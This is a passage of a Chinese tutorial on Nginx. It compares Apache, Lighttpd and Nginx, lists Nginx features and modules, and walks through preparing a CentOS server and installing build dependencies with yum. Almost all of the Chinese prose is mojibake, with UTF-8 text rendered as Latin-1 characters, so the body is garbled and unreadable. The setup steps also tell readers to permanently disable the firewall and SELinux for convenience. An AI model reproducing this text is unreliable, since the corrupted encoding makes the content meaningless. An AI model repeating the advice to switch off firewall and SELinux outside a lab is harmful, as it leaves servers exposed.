Apache</h4><p>â€‹Apacheçš„å‘å±•æ—¶æœŸå¾ˆé•¿ï¼ŒåŒæ—¶ä¹Ÿæœ‰è¿‡ä¸€æ®µè¾‰ç…Œçš„ä¸šç»©ã€‚ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºå¤§æ¦‚åœ¨2014å¹´ä»¥å‰éƒ½æ˜¯å¸‚åœºä»½é¢ç¬¬ä¸€çš„æœåŠ¡å™¨ã€‚Apacheæœ‰å¾ˆå¤šä¼˜ç‚¹ï¼Œå¦‚ç¨³å®šã€å¼€æºã€è·¨å¹³å°ç­‰ã€‚ä½†æ˜¯å®ƒå‡ºç°çš„æ—¶é—´å¤ªä¹…äº†ï¼Œåœ¨å®ƒå…´èµ·çš„å¹´ä»£ï¼Œäº’è”ç½‘çš„äº§ä¸šè§„æ¨¡è¿œè¿œä¸å¦‚ä»Šå¤©ï¼Œæ‰€ä»¥å®ƒè¢«è®¾è®¡æˆä¸€ä¸ªé‡é‡çº§çš„ã€ä¸æ”¯æŒé«˜å¹¶å‘çš„WebæœåŠ¡å™¨ã€‚åœ¨ApacheæœåŠ¡å™¨ä¸Šï¼Œå¦‚æœæœ‰æ•°ä»¥ä¸‡è®¡çš„å¹¶å‘HTTPè¯·æ±‚åŒæ—¶è®¿é—®ï¼Œå°±ä¼šå¯¼è‡´æœåŠ¡å™¨ä¸Šæ¶ˆè€—å¤§é‡èƒ½å­˜ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸å¯¹æˆç™¾ä¸Šåƒçš„Apacheè¿›ç¨‹åšè¿›ç¨‹é—´åˆ‡æ¢ä¹Ÿä¼šæ¶ˆè€—å¤§é‡çš„CUPèµ„æºï¼Œå¹¶å¯¼è‡´HTTPè¯·æ±‚çš„å¹³å‡å“åº”é€Ÿåº¦é™ä½ï¼Œè¿™äº›éƒ½å†³å®šäº†Apacheä¸å¯èƒ½æˆä¸ºé«˜æ€§èƒ½çš„WebæœåŠ¡å™¨ã€‚è¿™ä¹Ÿä¿ƒä½¿äº†Lighttpdå’ŒNginxçš„å‡ºç°ã€‚</p><h4 id="lighttpd"><a class="markdownIt-Anchor" href="#lighttpd"></a> Lighttpd</h4><p>â€‹Lighttpdæ˜¯å¾·å›½çš„ä¸€ä¸ªå¼€æºçš„WebæœåŠ¡å™¨è½¯ä»¶ï¼Œå®ƒå’ŒNginxä¸€æ ·ï¼Œéƒ½æ˜¯è½»é‡çº§ã€é«˜æ€§èƒ½çš„WebæœåŠ¡å™¨ï¼Œæ¬§ç¾çš„ä¸šç•Œå¼€å‘è€…æ¯”è¾ƒé’Ÿçˆ±Lighttpd,è€Œå›½å†…çš„å…¬å¸æ›´å¤šçš„é’çNginxï¼ŒåŒæ—¶ç½‘ä¸ŠNginxçš„èµ„æºè¦æ›´ä¸°å¯Œäº›ã€‚</p><h4 id="å…¶ä»–çš„æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#å…¶ä»–çš„æœåŠ¡å™¨"></a> å…¶ä»–çš„æœåŠ¡å™¨</h4><p>Google Serversï¼ŒWeblogic, Webshpere(IBM)â€¦</p><p>ç»è¿‡å„ä¸ªæœåŠ¡å™¨çš„å¯¹æ¯”ï¼Œç§ç§è¿¹è±¡éƒ½è¡¨æ˜ï¼ŒNginxå°†ä»¥æ€§èƒ½ä¸ºç‹ã€‚è¿™ä¹Ÿæ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆé€‰æ‹©Nginxçš„ç†ç”±ã€‚</p><h4 id="nginxçš„ä¼˜ç‚¹"><a class="markdownIt-Anchor" href="#nginxçš„ä¼˜ç‚¹"></a> Nginxçš„ä¼˜ç‚¹</h4><h5 id="1é€Ÿåº¦æ›´å¿«-å¹¶å‘æ›´é«˜"><a class="markdownIt-Anchor" href="#1é€Ÿåº¦æ›´å¿«-å¹¶å‘æ›´é«˜"></a> (1)é€Ÿåº¦æ›´å¿«ã€å¹¶å‘æ›´é«˜</h5><p>å•æ¬¡è¯·æ±‚æˆ–è€…é«˜å¹¶å‘è¯·æ±‚çš„ç¯å¢ƒä¸‹ï¼ŒNginxéƒ½ä¼šæ¯”å…¶ä»–WebæœåŠ¡å™¨å“åº”çš„é€Ÿåº¦æ›´å¿«ã€‚ä¸€æ–¹é¢åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå•æ¬¡è¯·æ±‚ä¼šå¾—åˆ°æ›´å¿«çš„å“åº”ï¼Œå¦ä¸€æ–¹é¢ï¼Œåœ¨é«˜å³°æœŸ(å¦‚æœ‰æ•°ä»¥ä¸‡è®¡çš„å¹¶å‘è¯·æ±‚)ï¼ŒNginxæ¯”å…¶ä»–WebæœåŠ¡å™¨æ›´å¿«çš„å“åº”è¯·æ±‚ã€‚Nginxä¹‹æ‰€ä»¥æœ‰è¿™ä¹ˆé«˜çš„å¹¶å‘å¤„ç†èƒ½åŠ›å’Œè¿™ä¹ˆå¥½çš„æ€§èƒ½åŸå› åœ¨äºNginxé‡‡ç”¨äº†å¤šè¿›ç¨‹å’ŒI/Oå¤šè·¯å¤ç”¨(epoll)çš„åº•å±‚å®ç°ã€‚</p><h5 id="2é…ç½®ç®€å•æ‰©å±•æ€§å¼º"><a class="markdownIt-Anchor" href="#2é…ç½®ç®€å•æ‰©å±•æ€§å¼º"></a> (2)é…ç½®ç®€å•ï¼Œæ‰©å±•æ€§å¼º</h5><p>Nginxçš„è®¾è®¡æå…·æ‰©å±•æ€§ï¼Œå®ƒæœ¬èº«å°±æ˜¯ç”±å¾ˆå¤šæ¨¡å—ç»„æˆï¼Œè¿™äº›æ¨¡å—çš„ä½¿ç”¨å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶çš„é…ç½®æ¥æ·»åŠ ã€‚è¿™äº›æ¨¡å—æœ‰å®˜æ–¹æä¾›çš„ä¹Ÿæœ‰ç¬¬ä¸‰æ–¹æä¾›çš„æ¨¡å—ï¼Œå¦‚æœéœ€è¦å®Œå…¨å¯ä»¥å¼€å‘æœåŠ¡è‡ªå·±ä¸šåŠ¡ç‰¹æ€§çš„å®šåˆ¶æ¨¡å—ã€‚</p><h5 id="3é«˜å¯é æ€§"><a class="markdownIt-Anchor" href="#3é«˜å¯é æ€§"></a> (3)é«˜å¯é æ€§</h5><p>Nginxé‡‡ç”¨çš„æ˜¯å¤šè¿›ç¨‹æ¨¡å¼è¿è¡Œï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªmasterä¸»è¿›ç¨‹å’ŒNå¤šä¸ªworkerè¿›ç¨‹ï¼Œworkerè¿›ç¨‹çš„æ•°é‡æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨è®¾ç½®ï¼Œæ¯ä¸ªworkerè¿›ç¨‹ä¹‹é—´éƒ½æ˜¯ç›¸äº’ç‹¬ç«‹æä¾›æœåŠ¡ï¼Œå¹¶ä¸”masterä¸»è¿›ç¨‹å¯ä»¥åœ¨æŸä¸€ä¸ªworkerè¿›ç¨‹å‡ºé”™æ—¶ï¼Œå¿«é€Ÿå»&quot;æ‹‰èµ·&quot;æ–°çš„workerè¿›ç¨‹æä¾›æœåŠ¡ã€‚</p><h5 id="4çƒ­éƒ¨ç½²"><a class="markdownIt-Anchor" href="#4çƒ­éƒ¨ç½²"></a> (4)çƒ­éƒ¨ç½²</h5><p>ç°åœ¨äº’è”ç½‘é¡¹ç›®éƒ½è¦æ±‚ä»¥7*24å°æ—¶è¿›è¡ŒæœåŠ¡çš„æä¾›ï¼Œé’ˆå¯¹äºè¿™ä¸€è¦æ±‚ï¼ŒNginxä¹Ÿæä¾›äº†çƒ­éƒ¨ç½²åŠŸèƒ½ï¼Œå³å¯ä»¥åœ¨Nginxä¸åœæ­¢çš„æƒ…å†µä¸‹ï¼Œå¯¹Nginxè¿›è¡Œæ–‡ä»¶å‡çº§ã€æ›´æ–°é…ç½®å’Œæ›´æ¢æ—¥å¿—æ–‡ä»¶ç­‰åŠŸèƒ½ã€‚</p><h5 id="5æˆæœ¬ä½-bsdè®¸å¯è¯"><a class="markdownIt-Anchor" href="#5æˆæœ¬ä½-bsdè®¸å¯è¯"></a> (5)æˆæœ¬ä½ã€BSDè®¸å¯è¯</h5><p>BSDæ˜¯ä¸€ä¸ªå¼€æºçš„è®¸å¯è¯ï¼Œä¸–ç•Œä¸Šçš„å¼€æºè®¸å¯è¯æœ‰å¾ˆå¤šï¼Œç°åœ¨æ¯”è¾ƒæµè¡Œçš„æœ‰å…­ç§åˆ†åˆ«æ˜¯GPLã€BSDã€MITã€Mozillaã€Apacheã€LGPLã€‚è¿™å…­ç§çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢ä¸€å¼ å›¾æ¥è§£é‡Šä¸‹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1585139995444.png" alt="1585139995444" /></p><p>Nginxæœ¬èº«æ˜¯å¼€æºçš„ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥å…è´¹çš„å°†Nginxåº”ç”¨åœ¨å•†ä¸šé¢†åŸŸï¼Œè€Œä¸”è¿˜å¯ä»¥åœ¨é¡¹ç›®ä¸­ç›´æ¥ä¿®æ”¹Nginxçš„æºç æ¥å®šåˆ¶è‡ªå·±çš„ç‰¹æ®Šè¦æ±‚ã€‚è¿™äº›ç‚¹ä¹Ÿéƒ½æ˜¯Nginxä¸ºä»€ä¹ˆèƒ½å¸å¼•æ— æ•°å¼€å‘è€…ç»§ç»­ä¸ºNginxæ¥è´¡çŒ®è‡ªå·±çš„æ™ºæ…§å’Œé’æ˜¥ã€‚OpenRestry [Nginx+Lua]   Tengine[æ·˜å®]</p><h3 id="nginxçš„åŠŸèƒ½ç‰¹æ€§åŠå¸¸ç”¨åŠŸèƒ½"><a class="markdownIt-Anchor" href="#nginxçš„åŠŸèƒ½ç‰¹æ€§åŠå¸¸ç”¨åŠŸèƒ½"></a> Nginxçš„åŠŸèƒ½ç‰¹æ€§åŠå¸¸ç”¨åŠŸèƒ½</h3><p>Nginxæä¾›çš„åŸºæœ¬åŠŸèƒ½æœåŠ¡ä»å¤§ä½“ä¸Šå½’çº³ä¸º&quot;åŸºæœ¬HTTPæœåŠ¡&quot;ã€â€œé«˜çº§HTTPæœåŠ¡â€å’Œ&quot;é‚®ä»¶æœåŠ¡&quot;ç­‰ä¸‰å¤§ç±»ã€‚</p><h4 id="åŸºæœ¬httpæœåŠ¡"><a class="markdownIt-Anchor" href="#åŸºæœ¬httpæœåŠ¡"></a> åŸºæœ¬HTTPæœåŠ¡</h4><p>Nginxå¯ä»¥æä¾›åŸºæœ¬HTTPæœåŠ¡ï¼Œå¯ä»¥ä½œä¸ºHTTPä»£ç†æœåŠ¡å™¨å’Œåå‘ä»£ç†æœåŠ¡å™¨ï¼Œæ”¯æŒé€šè¿‡ç¼“å­˜åŠ é€Ÿè®¿é—®ï¼Œå¯ä»¥å®Œæˆç®€å•çš„è´Ÿè½½å‡è¡¡å’Œå®¹é”™ï¼Œæ”¯æŒåŒ…è¿‡æ»¤åŠŸèƒ½ï¼Œæ”¯æŒSSLç­‰ã€‚</p><ul><li>å¤„ç†é™æ€æ–‡ä»¶ã€å¤„ç†ç´¢å¼•æ–‡ä»¶ä»¥åŠæ”¯æŒè‡ªåŠ¨ç´¢å¼•ï¼›</li><li>æä¾›åå‘ä»£ç†æœåŠ¡å™¨ï¼Œå¹¶å¯ä»¥ä½¿ç”¨ç¼“å­˜åŠ ä¸Šåå‘ä»£ç†ï¼ŒåŒæ—¶å®Œæˆè´Ÿè½½å‡è¡¡å’Œå®¹é”™ï¼›</li><li>æä¾›å¯¹FastCGIã€memcachedç­‰æœåŠ¡çš„ç¼“å­˜æœºåˆ¶ï¼Œï¼ŒåŒæ—¶å®Œæˆè´Ÿè½½å‡è¡¡å’Œå®¹é”™ï¼›</li><li>ä½¿ç”¨Nginxçš„æ¨¡å—åŒ–ç‰¹æ€§æä¾›è¿‡æ»¤å™¨åŠŸèƒ½ã€‚NginxåŸºæœ¬è¿‡æ»¤å™¨åŒ…æ‹¬gzipå‹ç¼©ã€rangesæ”¯æŒã€chunkedå“åº”ã€XSLTã€SSIä»¥åŠå›¾åƒç¼©æ”¾ç­‰ã€‚å…¶ä¸­é’ˆå¯¹åŒ…å«å¤šä¸ªSSIçš„é¡µé¢ï¼Œç»ç”±FastCGIæˆ–åå‘ä»£ç†ï¼ŒSSIè¿‡æ»¤å™¨å¯ä»¥å¹¶è¡Œå¤„ç†ã€‚</li><li>æ”¯æŒHTTPä¸‹çš„å®‰å…¨å¥—æ¥å±‚å®‰å…¨åè®®SSL.</li><li>æ”¯æŒåŸºäºåŠ æƒå’Œä¾èµ–çš„ä¼˜å…ˆæƒçš„HTTP/2</li></ul><h4 id="é«˜çº§httpæœåŠ¡"><a class="markdownIt-Anchor" href="#é«˜çº§httpæœåŠ¡"></a> é«˜çº§HTTPæœåŠ¡</h4><ul><li>æ”¯æŒåŸºäºåå­—å’ŒIPçš„è™šæ‹Ÿä¸»æœºè®¾ç½®</li><li>æ”¯æŒHTTP/1.0ä¸­çš„KEEP-Aliveæ¨¡å¼å’Œç®¡çº¿(PipeLined)æ¨¡å‹è¿æ¥</li><li>è‡ªå®šä¹‰è®¿é—®æ—¥å¿—æ ¼å¼ã€å¸¦ç¼“å­˜çš„æ—¥å¿—å†™æ“ä½œä»¥åŠå¿«é€Ÿæ—¥å¿—è½®è½¬ã€‚</li><li>æä¾›3xx~5xxé”™è¯¯ä»£ç é‡å®šå‘åŠŸèƒ½</li><li>æ”¯æŒé‡å†™ï¼ˆRewrite)æ¨¡å—æ‰©å±•</li><li>æ”¯æŒé‡æ–°åŠ è½½é…ç½®ä»¥åŠåœ¨çº¿å‡çº§æ—¶æ— éœ€ä¸­æ–­æ­£åœ¨å¤„ç†çš„è¯·æ±‚</li><li>æ”¯æŒç½‘ç»œç›‘æ§</li><li>æ”¯æŒFLVå’ŒMP4æµåª’ä½“ä¼ è¾“</li></ul><h4 id="é‚®ä»¶æœåŠ¡"><a class="markdownIt-Anchor" href="#é‚®ä»¶æœåŠ¡"></a> é‚®ä»¶æœåŠ¡</h4><p>Nginxæä¾›é‚®ä»¶ä»£ç†æœåŠ¡ä¹Ÿæ˜¯å…¶åŸºæœ¬å¼€å‘éœ€æ±‚ä¹‹ä¸€ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹ç‰¹æ€§ï¼š</p><ul><li>æ”¯æŒIMPA/POP3ä»£ç†æœåŠ¡åŠŸèƒ½</li><li>æ”¯æŒå†…éƒ¨SMTPä»£ç†æœåŠ¡åŠŸèƒ½</li></ul><h4 id="nginxå¸¸ç”¨çš„åŠŸèƒ½æ¨¡å—"><a class="markdownIt-Anchor" href="#nginxå¸¸ç”¨çš„åŠŸèƒ½æ¨¡å—"></a> Nginxå¸¸ç”¨çš„åŠŸèƒ½æ¨¡å—</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coq">é™æ€èµ„æºéƒ¨ç½²<br><span class="hljs-keyword">Rewrite</span>åœ°å€é‡å†™<br>æ­£åˆ™è¡¨è¾¾å¼<br>åå‘ä»£ç†<br>è´Ÿè½½å‡è¡¡<br>è½®è¯¢ã€åŠ æƒè½®è¯¢ã€ip_hashã€url_hashã€fair<br>Webç¼“å­˜<br>ç¯å¢ƒéƒ¨ç½²<br>é«˜å¯ç”¨çš„ç¯å¢ƒ<br>ç”¨æˆ·è®¤è¯æ¨¡å—...<br></code></pre></td></tr></table></figure><p>Nginxçš„æ ¸å¿ƒç»„æˆ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">nginxäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶<br>nginx.<span class="hljs-keyword">conf</span>é…ç½®æ–‡ä»¶<br><span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span>é”™è¯¯çš„æ—¥å¿—è®°å½•<br>access.<span class="hljs-keyword">log</span>è®¿é—®æ—¥å¿—è®°å½•<br></code></pre></td></tr></table></figure><h2 id="nginxç¯å¢ƒå‡†å¤‡"><a class="markdownIt-Anchor" href="#nginxç¯å¢ƒå‡†å¤‡"></a> Nginxç¯å¢ƒå‡†å¤‡</h2><h3 id="nginxç‰ˆæœ¬ä»‹ç»"><a class="markdownIt-Anchor" href="#nginxç‰ˆæœ¬ä»‹ç»"></a> Nginxç‰ˆæœ¬ä»‹ç»</h3><p>Nginxçš„å®˜æ–¹ç½‘ç«™ä¸º: <a href="http://nginx.org">http://nginx.org</a></p><p>æ‰“å¼€æºç å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„é¡µé¢å†…å®¹</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1580461114467.png" alt="1580461114467" /></p><p>Nginxçš„å®˜æ–¹ä¸‹è½½ç½‘ç«™ä¸º<a href="http://nginx.org/en/download.html">http://nginx.org/en/download.html</a>ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥ä¹‹é—´åœ¨é¦–é¡µé€‰ä¸­å³è¾¹çš„downloadè¿›å…¥ç‰ˆæœ¬ä¸‹è½½ç½‘é¡µã€‚åœ¨ä¸‹è½½é¡µé¢æˆ‘ä»¬ä¼šçœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1580463222053.png" alt="1580463222053" /></p><h3 id="è·å–nginxæºç "><a class="markdownIt-Anchor" href="#è·å–nginxæºç "></a> è·å–Nginxæºç </h3><p><a href="http://nginx.org/download/">http://nginx.org/download/</a></p><p>æ‰“å¼€ä¸Šè¿°ç½‘ç«™ï¼Œå°±å¯ä»¥æŸ¥çœ‹åˆ°Nginxçš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œé€‰ä¸­è‡ªå·±éœ€è¦çš„ç‰ˆæœ¬è¿›è¡Œä¸‹è½½ã€‚ä¸‹è½½æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨windowsä¸Šä¸‹è½½ç„¶åä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä»æœåŠ¡å™¨ä¸Šä¸‹è½½ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å‡†å¤‡ä¸€å°æœåŠ¡å™¨ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1580610584036.png" alt="1580610584036" /></p><h3 id="å‡†å¤‡æœåŠ¡å™¨ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#å‡†å¤‡æœåŠ¡å™¨ç³»ç»Ÿ"></a> å‡†å¤‡æœåŠ¡å™¨ç³»ç»Ÿ</h3><p>ç¯å¢ƒå‡†å¤‡</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">VMware WorkStation<br>Centos7<br>MobaXterm<br><span class="hljs-built_in">xsheel,</span>SecureCRT<br>ç½‘ç»œ<br></code></pre></td></tr></table></figure><p>(1)ç¡®è®¤centosçš„å†…æ ¸</p><p>å‡†å¤‡ä¸€ä¸ªå†…æ ¸ä¸º2.6åŠä»¥ä¸Šç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿï¼Œå› ä¸ºlinux2.6åŠä»¥ä¸Šå†…æ ¸æ‰æ”¯æŒepoll,è€ŒNginxéœ€è¦è§£å†³é«˜å¹¶å‘å‹åŠ›é—®é¢˜æ˜¯éœ€è¦ç”¨åˆ°epollï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æœ‰è¿™æ ·çš„ç‰ˆæœ¬è¦æ±‚ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>uname -a</code>å‘½ä»¤æ¥æŸ¥è¯¢linuxçš„å†…æ ¸ç‰ˆæœ¬ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581416022481.png" alt="1581416022481" /></p><p>(2)ç¡®ä¿centosèƒ½è”ç½‘</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">ping</span> www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1585224061192.png" alt="1585224061192" /></p><p>(3)ç¡®è®¤å…³é—­é˜²ç«å¢™</p><p>è¿™ä¸€é¡¹çš„è¦æ±‚ä»…é’ˆå¯¹äºé‚£äº›å¯¹linuxç³»ç»Ÿçš„é˜²ç«å¢™è®¾ç½®è§„åˆ™ä¸å¤ªæ¸…æ¥šçš„ï¼Œå»ºè®®å¤§å®¶æŠŠé˜²ç«å¢™éƒ½å…³é—­æ‰ï¼Œå› ä¸ºæˆ‘ä»¬æ­¤æ¬¡è¯¾ç¨‹ä¸»è¦çš„å†…å®¹æ˜¯å¯¹Nginxçš„å­¦ä¹ ï¼ŒæŠŠé˜²ç«å¢™å…³é—­æ‰ï¼Œå¯ä»¥çœæ‰åç»­Nginxå­¦ä¹ è¿‡ç¨‹ä¸­é‡åˆ°çš„è¯¸å¤šé—®é¢˜ã€‚</p><p>å…³é—­çš„æ–¹å¼æœ‰å¦‚ä¸‹ä¸¤ç§ï¼š</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl stop firewalld      å…³é—­è¿è¡Œçš„é˜²ç«å¢™ï¼Œç³»ç»Ÿé‡æ–°å¯åŠ¨åï¼Œé˜²ç«å¢™å°†é‡æ–°æ‰“å¼€<br><span class="hljs-params">system</span>ctl disable firewalld   æ°¸ä¹…å…³é—­é˜²ç«å¢™ï¼Œï¼Œç³»ç»Ÿé‡æ–°å¯åŠ¨åï¼Œé˜²ç«å¢™ä¾ç„¶å…³é—­<br><span class="hljs-params">system</span>ctl status firewalld æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰ç¡®è®¤åœç”¨selinux</p><p>selinux(security-enhanced linux),ç¾å›½å®‰å…¨å±€å¯¹äºå¼ºåˆ¶è®¿é—®æ§åˆ¶çš„å®ç°ï¼Œåœ¨linux2.6å†…æ ¸ä»¥åçš„ç‰ˆæœ¬ä¸­ï¼Œselinuxå·²ç»æˆåŠŸå†…æ ¸ä¸­çš„ä¸€éƒ¨åˆ†ã€‚å¯ä»¥è¯´selinuxæ˜¯linuxå²ä¸Šæœ€æ°å‡ºçš„æ–°å®‰å…¨å­ç³»ç»Ÿä¹‹ä¸€ã€‚è™½ç„¶æœ‰äº†selinuxï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿä¼šæ›´å®‰å…¨ï¼Œä½†æ˜¯å¯¹äºæˆ‘ä»¬çš„å­¦ä¹ Nginxçš„å†ç¨‹ä¸­ï¼Œä¼šå¤šå¾ˆå¤šè®¾ç½®ï¼Œæ‰€ä»¥è¿™å—å»ºè®®å¤§å®¶å°†selinuxè¿›è¡Œå…³é—­ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581418750246.png" alt="" /></p><p>sestatusæŸ¥çœ‹çŠ¶æ€</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581419845687.png" alt="1581419845687" /></p><p>å¦‚æœæŸ¥çœ‹ä¸æ˜¯disabledçŠ¶æ€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥è¿›è¡Œè®¾ç½®,ä¿®æ”¹SELINUX=disabledï¼Œç„¶åé‡å¯ä¸‹ç³»ç»Ÿå³å¯ç”Ÿæ•ˆã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>selinux/config<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581419902873.png" alt="1581419902873" /></p><h3 id="nginxå®‰è£…æ–¹å¼ä»‹ç»"><a class="markdownIt-Anchor" href="#nginxå®‰è£…æ–¹å¼ä»‹ç»"></a> Nginxå®‰è£…æ–¹å¼ä»‹ç»</h3><p>Nginxçš„å®‰è£…æ–¹å¼æœ‰ä¸¤ç§åˆ†åˆ«æ˜¯:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">é€šè¿‡Nginxæºç <br>é€šè¿‡Nginxæºç ç®€å•å®‰è£… (<span class="hljs-number">1</span>)<br>é€šè¿‡Nginxæºç å¤æ‚å®‰è£… (<span class="hljs-number">3</span>)<br>é€šè¿‡yumå®‰è£… (<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>å¦‚æœé€šè¿‡Nginxæºç å®‰è£…éœ€è¦æå‰å‡†å¤‡çš„å†…å®¹ï¼š</p><h5 id="gccç¼–è¯‘å™¨"><a class="markdownIt-Anchor" href="#gccç¼–è¯‘å™¨"></a> GCCç¼–è¯‘å™¨</h5><p>Nginxæ˜¯ä½¿ç”¨Cè¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå› æ­¤æƒ³è¦è¿è¡ŒNginxå°±éœ€è¦å®‰è£…ä¸€ä¸ªç¼–è¯‘å·¥å…·ã€‚GCCå°±æ˜¯ä¸€ä¸ªå¼€æºçš„ç¼–è¯‘å™¨é›†åˆï¼Œç”¨äºå¤„ç†å„ç§å„æ ·çš„è¯­è¨€ï¼Œå…¶ä¸­å°±åŒ…å«äº†Cè¯­è¨€ã€‚</p><p>ä½¿ç”¨å‘½ä»¤<code>yum install -y gcc</code>æ¥å®‰è£…</p><p>å®‰è£…æˆåŠŸåï¼Œå¯ä»¥é€šè¿‡<code>gcc --version</code>æ¥æŸ¥çœ‹gccæ˜¯å¦å®‰è£…æˆåŠŸ</p><h5 id="pcre"><a class="markdownIt-Anchor" href="#pcre"></a> PCRE</h5><p>Nginxåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­éœ€è¦ä½¿ç”¨åˆ°PCREåº“ï¼ˆperl Compatible Regular Expressoin å…¼å®¹æ­£åˆ™è¡¨è¾¾å¼åº“)ï¼Œå› ä¸ºåœ¨Nginxçš„Rewriteæ¨¡å—å’Œhttpæ ¸å¿ƒæ¨¡å—éƒ½ä¼šä½¿ç”¨åˆ°PCREæ­£åˆ™è¡¨è¾¾å¼è¯­æ³•ã€‚</p><p>å¯ä»¥ä½¿ç”¨å‘½ä»¤<code>yum install -y pcre pcre-devel</code>æ¥è¿›è¡Œå®‰è£…</p><p>å®‰è£…æˆåŠŸåï¼Œå¯ä»¥é€šè¿‡<code>rpm -qa pcre pcre-devel</code>æ¥æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</p><h5 id="zlib"><a class="markdownIt-Anchor" href="#zlib"></a> zlib</h5><p>zlibåº“æä¾›äº†å¼€å‘äººå‘˜çš„å‹ç¼©ç®—æ³•ï¼Œåœ¨Nginxçš„å„ä¸ªæ¨¡å—ä¸­éœ€è¦ä½¿ç”¨gzipå‹ç¼©ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿéœ€è¦æå‰å®‰è£…å…¶åº“åŠæºä»£ç zlibå’Œzlib-devel</p><p>å¯ä»¥ä½¿ç”¨å‘½ä»¤<code>yum install -y zlib zlib-devel</code>æ¥è¿›è¡Œå®‰è£…</p><p>å®‰è£…æˆåŠŸåï¼Œå¯ä»¥é€šè¿‡<code>rpm -qa zlib zlib-devel</code>æ¥æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</p><h5 id="openssl"><a class="markdownIt-Anchor" href="#openssl"></a> OpenSSL</h5><p>OpenSSLæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„è½¯ä»¶åº“åŒ…ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨è¿™ä¸ªåŒ…è¿›è¡Œå®‰å…¨é€šä¿¡ï¼Œå¹¶ä¸”é¿å…è¢«çªƒå¬ã€‚</p><p>SSL:Secure Sockets Layerå®‰å…¨å¥—æ¥åè®®çš„ç¼©å†™ï¼Œå¯ä»¥åœ¨Internetä¸Šæä¾›ç§˜å¯†æ€§ä¼ è¾“ï¼Œå…¶ç›®æ ‡æ˜¯ä¿è¯ä¸¤ä¸ªåº”ç”¨é—´é€šä¿¡çš„ä¿å¯†æ€§å’Œå¯é 